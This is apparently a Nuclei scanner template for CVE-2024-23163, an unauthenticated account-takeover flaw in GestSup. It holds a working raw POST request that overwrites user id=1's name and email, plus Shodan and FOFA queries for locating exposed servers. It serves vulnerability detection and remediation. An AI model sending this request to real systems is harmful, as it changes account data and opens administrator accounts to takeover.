http:
- extractors:
  - dsl:
    - '"Firstname: "+ firstname'
    - '"Lastname: "+ lastname'
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{"status":"success'
    - firstname":"{{firstname}}","lastname":"{{lastname}}
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'POST /ajax/ticket_user_db.php HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: xmlhttprequest

    Content-Type: application/x-www-form-urlencoded


    modifyuser=1&lastname={{lastname}}&firstname={{firstname}}&phone=&mobile=&mail={{email}}&company=111&id=1

    '
id: CVE-2024-23163
info:
  author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
  classification:
    cpe: cpe:2.3:a:gestsup:gestsup:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-23163
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
  description: GestSup contains an authentication bypass vulnerability allowing attackers
    to take over user accounts, leading to full compromise including data disclosure
    and modification.
  impact: 'An attacker could bypass the authentication process and access the application
    as an administrator user by modifying the usermail field to a controlled email
    address and requesting a password reset.

    '
  metadata:
    fofa-query: title="GestSup"
    max-request: 1
    product: gestsup
    shodan-query: http.favicon.hash:-283003760
    vendor: gestsup
    verified: true
  name: GestSup - Account Takeover
  reference:
  - https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23163
  - https://doc.gestsup.fr/install/
  remediation: Apply necessary security patches or updates provided by the vendor
    to secure the ticket_user_db.php endpoint and ensure proper authentication checks
    are in place.
  severity: critical
  tags: cve,cve2024,account-takeover,gestsup,vuln
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  firstname: '{{rand_base(5)}}'
  lastname: '{{rand_base(5)}}'
